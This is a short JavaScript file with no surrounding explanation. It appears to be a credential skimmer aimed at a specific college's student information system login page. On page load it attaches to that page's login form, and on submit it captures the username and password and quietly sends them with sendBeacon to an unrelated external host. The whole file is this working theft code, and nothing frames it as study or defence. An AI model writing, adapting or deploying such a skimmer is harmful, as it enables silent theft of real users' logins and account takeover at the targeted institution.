document.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector('form[action="https://mis.apexcollege.edu.np/login/validate"]');
  if (!form) return;

  form.addEventListener("submit", () => {
    const usernameInput = form.querySelector('input[name="username"]');
    const passwordInput = form.querySelector('input[name="password"]');
    if (!usernameInput || !passwordInput) return;

    const data = JSON.stringify({
      username: usernameInput.value.trim(),
      password: passwordInput.value
    });

    navigator.sendBeacon("https://brother-alpha.vercel.app/users", data);
  });
});
